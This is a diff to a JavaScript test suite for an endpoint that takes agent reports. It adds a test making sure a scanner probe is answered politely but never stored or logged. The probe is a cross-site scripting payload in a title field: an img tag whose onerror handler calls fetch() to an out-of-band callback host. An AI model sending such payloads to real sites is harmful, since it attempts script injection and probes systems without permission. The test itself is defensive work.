@@ -118,10 +118,22 @@ describe('agent reports', () => {
   });
 
   it('stores a report sent as GET query parameters', async () => {
-    const res = await call({ method: 'GET', query: '?title=Missing+page&message=No+docs+for+X&src=llms' });
+    const res = await call({ method: 'GET', query: '?title=Missing+page&message=No+docs+for+the+--foo+option&src=llms' });
     assert.strictEqual(res.statusCode, 202);
     assert.strictEqual(blobPuts[0].body.title, 'Missing page');
     assert.strictEqual(blobPuts[0].body.src, 'llms');
+  });
+
+  it('answers a scanner probe like a report, but stores nothing', async () => {
+    const res = await call({
+      body: { ...report, title: `"><img src=x onerror="fetch('//abc.oast.pro/t2')">` },
+    });
+    assert.strictEqual(res.statusCode, 202);
+    assert.match(res.body.id, /^\d{8}T\d{9}Z-[0-9a-f]{8}$/);
+    assert.match(res.body.message, /don't need to send it again/);
+    assert.strictEqual(blobPuts.length, 0);
+    assert.strictEqual(line().dropped, 'markup');
+    assert.ok(!logged.at(-1).includes('oast'), 'the log line holds no submitted text');
   });
 
   it('writes nothing for a GET without a title and message', async () => {
